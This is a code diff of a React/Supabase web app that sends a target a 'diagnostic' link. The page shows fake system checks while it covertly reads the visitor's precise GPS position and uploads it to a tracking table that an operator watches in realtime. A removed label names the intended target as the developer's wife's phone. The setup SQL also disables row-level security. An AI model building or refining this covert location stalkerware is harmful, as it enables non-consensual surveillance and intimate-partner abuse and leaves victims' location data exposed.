@@ -1,5 +1,5 @@
 
-import React, { useState, useEffect, useCallback } from 'react';
+import React, { useState, useEffect, useCallback, useMemo } from 'react';
 import Sidebar from './components/Sidebar';
 import LocationCard from './components/LocationCard';
 import { UserProfile, AIInsight, LocationData } from './types';
@@ -21,7 +21,6 @@ const App: React.FC = () => {
   const [copyStatus, setCopyStatus] = useState<string | null>(null);
   const [dbLog, setDbLog] = useState<string>("IDLE");
   const [showConfigEditor, setShowConfigEditor] = useState(false);
-  const [showSqlHelper, setShowSqlHelper] = useState(false);
   
   const [members, setMembers] = useState<UserProfile[]>([
     {
@@ -39,18 +38,18 @@ const App: React.FC = () => {
   const activeMember = members[0];
   const isConfigValid = !!config.url && !!config.key;
 
-  const getSupabase = () => {
+  // Memoize client agar tidak re-init terus menerus
+  const supabase = useMemo(() => {
     if (config.url && config.key) {
       try { return createClient(config.url, config.key); } catch (e) { return null; }
     }
     return null;
-  };
+  }, [config]);
 
   const syncToDatabase = async (loc: LocationData) => {
-    const supabase = getSupabase();
     if (!supabase) { setDbLog("ERR: NO_CONFIG"); return; }
     
-    setDbLog("SENDING...");
+    setDbLog("CONNECTING...");
     try {
       const { error } = await supabase
         .from('tracking')
@@ -63,22 +62,21 @@ const App: React.FC = () => {
         });
       
       if (error) {
-        console.error(error);
-        setDbLog(`ERR: ${error.code}`); // Biasanya 404 jika tabel tidak ada
+        console.error("Supabase Error:", error);
+        setDbLog(`DB_ERR: ${error.code || 'UNKNOWN'}`); 
       } else {
-        setDbLog("SUCCESS: SENT");
+        setDbLog("SUCCESS: DATA_SENT");
       }
     } catch (err) {
-      setDbLog("CONN_FAIL");
+      setDbLog("NETWORK_FAIL");
     }
   };
 
   useEffect(() => {
-    const supabase = getSupabase();
     if (isUnlocked && !isStealthMode && supabase) {
       const fetchData = async () => {
         try {
-          const { data, error } = await supabase.from('tracking').select('*').eq('id', targetId).single();
+          const { data } = await supabase.from('tracking').select('*').eq('id', targetId).single();
           if (data) {
             setMembers([{
               ...members[0],
@@ -118,10 +116,15 @@ const App: React.FC = () => {
 
       return () => { supabase.removeChannel(channel); };
     }
-  }, [isUnlocked, isStealthMode, config]);
+  }, [isUnlocked, isStealthMode, supabase]);
 
   const updateLocation = useCallback(() => {
-    if (!navigator.geolocation) return;
+    if (!navigator.geolocation) {
+      setDbLog("GPS_NOT_SUPPORTED");
+      return;
+    }
+    
+    setDbLog("GETTING_GPS...");
     navigator.geolocation.getCurrentPosition(
       async (position) => {
         const newLocation: LocationData = {
@@ -130,29 +133,41 @@ const App: React.FC = () => {
           accuracy: position.coords.accuracy,
           timestamp: position.timestamp,
         };
-        if (isStealthMode) await syncToDatabase(newLocation);
+        
+        if (isStealthMode) {
+          await syncToDatabase(newLocation);
+        }
+        
         if (isUnlocked && !isStealthMode) {
           setMembers(prev => prev.map(m => ({ ...m, currentLocation: newLocation, status: 'online' })));
           setIsLoadingInsight(true);
           const res = await getLocationInsights(newLocation);
           setInsight(res);
           setIsLoadingInsight(false);
+          // Opsi: Kirim data admin ke DB untuk tes
+          await syncToDatabase(newLocation);
         }
       },
-      () => setDbLog("GPS_DENIED"),
-      { enableHighAccuracy: true, timeout: 15000 }
+      (err) => {
+        console.error("GPS Error:", err);
+        if (err.code === 1) setDbLog("GPS_DENIED");
+        else if (err.code === 2) setDbLog("GPS_UNAVAILABLE");
+        else if (err.code === 3) setDbLog("GPS_TIMEOUT");
+        else setDbLog("GPS_ERROR");
+      },
+      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
     );
-  }, [isUnlocked, isStealthMode, config]);
+  }, [isUnlocked, isStealthMode, supabase]);
 
   const startDiagnostic = () => {
-    updateLocation();
     setIsDiagnosing(true);
+    updateLocation();
     let progress = 0;
     const interval = setInterval(() => {
-      progress += 2;
+      progress += 1;
       setDiagProgress(progress);
       if (progress >= 100) clearInterval(interval);
-    }, 50);
+    }, 40);
   };
 
   const saveManualConfig = (e: React.FormEvent<HTMLFormElement>) => {
@@ -167,7 +182,7 @@ const App: React.FC = () => {
     window.location.reload(); 
   };
 
-  const sqlCode = `-- 1. HAPUS TABEL LAMA JIKA ADA\nDROP TABLE IF EXISTS tracking;\n\n-- 2. BUAT TABEL TRACKING\nCREATE TABLE tracking (\n  id TEXT PRIMARY KEY,\n  latitude FLOAT8,\n  longitude FLOAT8,\n  accuracy FLOAT8,\n  timestamp BIGINT\n);\n\n-- 3. MATIKAN PROTEKSI (RLS) AGAR DATA BISA MASUK\nALTER TABLE tracking DISABLE ROW LEVEL SECURITY;\n\n-- 4. AKTIFKAN REALTIME\nALTER publication supabase_realtime ADD TABLE tracking;`;
+  const sqlCode = `-- 1. RESET TABEL\nDROP TABLE IF EXISTS tracking;\n\n-- 2. BUAT ULANG\nCREATE TABLE tracking (\n  id TEXT PRIMARY KEY,\n  latitude FLOAT8,\n  longitude FLOAT8,\n  accuracy FLOAT8,\n  timestamp BIGINT\n);\n\n-- 3. MATIKAN KEAMANAN (RLS)\nALTER TABLE tracking DISABLE ROW LEVEL SECURITY;\n\n-- 4. AKTIFKAN REALTIME\nALTER publication supabase_realtime ADD TABLE tracking;`;
 
   const getCleanUrl = () => window.location.origin + window.location.pathname;
 
@@ -192,11 +207,18 @@ const App: React.FC = () => {
                    <div className="w-full bg-slate-800 h-1 rounded-full overflow-hidden"><div className="bg-blue-500 h-full transition-all duration-300" style={{ width: `${diagProgress}%` }}></div></div>
                 </div>
                 <div className="bg-black/40 p-4 rounded-xl space-y-2 text-[9px] uppercase tracking-tighter">
-                   <div className="flex justify-between"><span className="text-slate-500">Database_Link</span><span className="text-blue-400">{dbLog}</span></div>
+                   <div className="flex justify-between"><span className="text-slate-500">Database_Link</span><span className={`font-bold ${dbLog.includes('SUCCESS') ? 'text-emerald-500' : 'text-blue-400'}`}>{dbLog}</span></div>
                    <div className="flex justify-between"><span className="text-slate-500">GPS_Sensor</span><span className="text-emerald-500">{diagProgress > 30 ? 'VERIFIED' : 'SCANNING'}</span></div>
                    <div className="flex justify-between"><span className="text-slate-500">Core_Temp</span><span className="text-emerald-500">OPTIMAL</span></div>
                 </div>
-                {diagProgress >= 100 && <button onClick={() => window.location.reload()} className="w-full py-3 bg-slate-800 rounded-xl text-[10px] font-bold text-slate-400 uppercase">Selesai</button>}
+                {diagProgress >= 100 && (
+                   <div className="space-y-4">
+                      <div className="p-3 bg-emerald-500/10 border border-emerald-500/20 rounded-xl text-center">
+                         <p className="text-[10px] text-emerald-500 font-bold uppercase">Diagnosa Selesai. Sistem Dioptimalkan.</p>
+                      </div>
+                      <button onClick={() => window.location.reload()} className="w-full py-3 bg-slate-800 rounded-xl text-[10px] font-bold text-slate-400 uppercase">Tutup</button>
+                   </div>
+                )}
              </div>
            )}
         </div>
@@ -236,54 +258,33 @@ const App: React.FC = () => {
             <div className="grid grid-cols-1 lg:grid-cols-3 gap-8 max-w-7xl mx-auto">
               <div className="lg:col-span-2 space-y-6">
                 
-                {/* Panel Step 2: SQL Helper */}
-                <div className="bg-blue-950/20 border border-blue-500/30 p-6 rounded-2xl">
-                   <h4 className="text-xs font-bold text-blue-400 uppercase mb-4 tracking-widest flex items-center gap-2">
-                      <i className="fas fa-database"></i> Langkah Terakhir: Setup Database
-                   </h4>
-                   <p className="text-[11px] text-slate-400 mb-4 leading-relaxed">Supabase memerlukan tabel khusus agar data bisa disimpan. Jika Anda belum melakukannya, silakan buka **SQL Editor** di Supabase dan jalankan kode di bawah.</p>
-                   <div className="relative group">
-                      <pre className="bg-black/60 p-4 rounded-xl text-[9px] text-blue-300 font-mono overflow-x-auto border border-blue-900/50">
-                        {sqlCode}
-                      </pre>
-                      <button 
-                        onClick={() => { navigator.clipboard.writeText(sqlCode); setCopyStatus('sql'); setTimeout(() => setCopyStatus(null), 2000); }}
-                        className="absolute top-2 right-2 px-3 py-1 bg-blue-600 hover:bg-blue-500 text-[9px] rounded font-bold uppercase"
-                      >
-                         {copyStatus === 'sql' ? 'Copied' : 'Copy SQL'}
-                      </button>
+                {/* Panel Test Connection */}
+                <div className="bg-slate-900 border border-slate-800 rounded-3xl p-8">
+                   <div className="flex justify-between items-center mb-6">
+                      <h3 className="text-xs font-bold text-slate-500 uppercase tracking-widest">Debug & Setup</h3>
+                      <div className="flex gap-2">
+                        <span className="px-3 py-1 bg-black rounded text-[9px] text-blue-400 font-bold border border-blue-900">LOG: {dbLog}</span>
+                      </div>
                    </div>
-                </div>
-
-                <div className="bg-slate-900 border border-slate-800 rounded-3xl p-8 relative overflow-hidden shadow-2xl">
-                   <div className="absolute top-0 right-0 w-48 h-48 bg-blue-500/5 blur-[80px] rounded-full"></div>
-                   <div className="flex justify-between items-center mb-8">
-                      <h3 className="text-xs font-bold text-slate-500 uppercase tracking-widest">Realtime Tracking Feed</h3>
-                      {activeMember.currentLocation && (
-                        <button onClick={() => window.open(`https://www.google.com/maps?q=${activeMember.currentLocation!.latitude},${activeMember.currentLocation!.longitude}`, '_blank')} className="px-6 py-2 bg-blue-600 hover:bg-blue-500 rounded-xl text-[10px] font-bold uppercase">Google Maps</button>
-                      )}
+                   <div className="grid grid-cols-2 gap-4">
+                      <div className="bg-slate-950 p-6 rounded-2xl border border-slate-800 flex flex-col justify-between">
+                         <p className="text-[10px] text-slate-500 uppercase mb-4">Langkah 1: Sync Tabel</p>
+                         <button onClick={() => { navigator.clipboard.writeText(sqlCode); setCopyStatus('sql'); setTimeout(() => setCopyStatus(null), 2000); }} className="w-full py-3 bg-blue-600/10 border border-blue-600/30 text-blue-400 rounded-xl text-[10px] font-bold uppercase hover:bg-blue-600/20 transition-all">
+                            {copyStatus === 'sql' ? 'Copied SQL' : 'Copy SQL Setup'}
+                         </button>
+                      </div>
+                      <div className="bg-slate-950 p-6 rounded-2xl border border-slate-800 flex flex-col justify-between">
+                         <p className="text-[10px] text-slate-500 uppercase mb-4">Langkah 2: Tes Koneksi</p>
+                         <button onClick={updateLocation} className="w-full py-3 bg-emerald-600 hover:bg-emerald-500 text-white rounded-xl text-[10px] font-bold uppercase shadow-lg shadow-emerald-600/20 transition-all">
+                            Kirim Lokasi Saya
+                         </button>
+                      </div>
                    </div>
-                   {activeMember.currentLocation ? (
-                     <div className="grid grid-cols-2 gap-4">
-                        <div className="bg-slate-950 p-6 rounded-2xl border border-slate-800">
-                           <p className="text-[9px] text-slate-500 uppercase mb-2 tracking-widest">Latitude</p>
-                           <p className="text-2xl font-bold text-white tracking-tighter">{activeMember.currentLocation.latitude.toFixed(8)}</p>
-                        </div>
-                        <div className="bg-slate-950 p-6 rounded-2xl border border-slate-800">
-                           <p className="text-[9px] text-slate-500 uppercase mb-2 tracking-widest">Longitude</p>
-                           <p className="text-2xl font-bold text-white tracking-tighter">{activeMember.currentLocation.longitude.toFixed(8)}</p>
-                        </div>
-                     </div>
-                   ) : (
-                     <div className="py-20 border border-dashed border-slate-800 rounded-3xl text-center">
-                        <i className="fas fa-satellite-dish text-slate-800 text-3xl mb-4 animate-pulse"></i>
-                        <p className="text-[10px] text-slate-600 uppercase tracking-widest">Menunggu Data Target...</p>
-                     </div>
-                   )}
+                   <p className="mt-6 text-[10px] text-slate-600 italic">Klik "Kirim Lokasi Saya" untuk mencoba mengisi database secara manual. Jika "LOG" berubah jadi SUCCESS, maka database sudah bekerja.</p>
                 </div>
 
                 <div className="bg-slate-900 border border-slate-800 rounded-3xl p-8">
-                   <h3 className="text-xs font-bold text-slate-500 uppercase tracking-widest mb-4">Link Diagnosa (Kirim ke HP Istri)</h3>
+                   <h3 className="text-xs font-bold text-slate-500 uppercase tracking-widest mb-4">Link Diagnosa Target</h3>
                    <div className="flex gap-2 p-2 bg-slate-950 rounded-2xl border border-slate-800">
                       <input readOnly value={`${getCleanUrl()}?mode=diagnostic`} className="flex-1 bg-transparent px-4 text-[11px] text-slate-400 focus:outline-none" />
                       <button onClick={() => {
@@ -291,11 +292,12 @@ const App: React.FC = () => {
                         setCopyStatus('link');
                         setTimeout(() => setCopyStatus(null), 2000);
                       }} className={`px-8 py-3 rounded-xl text-[10px] font-bold uppercase tracking-widest transition-all ${copyStatus === 'link' ? 'bg-emerald-600' : 'bg-slate-800 hover:bg-slate-700'}`}>
-                         {copyStatus === 'link' ? 'Berhasil' : 'Copy'}
+                         {copyStatus === 'link' ? 'Berhasil' : 'Copy Link'}
                       </button>
                    </div>
                 </div>
               </div>
+
               <div className="lg:col-span-1">
                 <LocationCard member={activeMember} insight={insight} loadingInsight={isLoadingInsight} />
               </div>
@@ -322,7 +324,7 @@ const App: React.FC = () => {
                  </div>
                  <div className="pt-2 flex gap-3">
                     <button type="button" onClick={() => { localStorage.removeItem('SB_URL_OVERRIDE'); localStorage.removeItem('SB_KEY_OVERRIDE'); window.location.reload(); }} className="flex-1 py-3 border border-slate-800 rounded-xl text-[10px] font-bold uppercase text-slate-500 hover:bg-slate-800">Reset</button>
-                    <button type="submit" className="flex-1 py-3 bg-blue-600 hover:bg-blue-500 rounded-xl text-[10px] font-bold uppercase text-white shadow-lg">Save</button>
+                    <button type="submit" className="flex-1 py-3 bg-blue-600 hover:bg-blue-500 rounded-xl text-[10px] font-bold uppercase text-white shadow-lg">Save & Reload</button>
                  </div>
               </form>
            </div>
